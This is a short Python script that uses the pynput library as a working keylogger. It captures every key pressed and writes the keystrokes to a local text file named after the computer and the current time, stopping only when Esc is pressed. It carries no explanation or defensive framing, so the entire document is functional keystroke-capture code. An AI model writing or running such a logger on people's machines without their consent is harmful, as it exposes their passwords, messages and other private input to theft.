from pynput.keyboard import Key, Listener
import os
import datetime

keys = []

def on_press(key):
    keys.append(key)
    write_keys_to_file(keys)
    
def write_keys_to_file(keys):
    computername = os.getenv('COMPUTERNAME')
    date = datetime.datetime.now()
        
    filename = "{}_{}_{}_{}_{}_{}_record.txt".format(computername, date.strftime("%d"), date.strftime("%m"), date.strftime("%Y"), date.strftime("%H"), date.strftime("%M"))
    
    with open(filename, 'w') as rec_file:
        for key in keys:
            key = str(key).replace("'", "")
            rec_file.write(key)
            rec_file.write("\n")
            
def on_release(key):
    if key == Key.esc:
        return False 
    
with Listener(on_press=on_press, on_release=on_release) as listener :
    listener.join()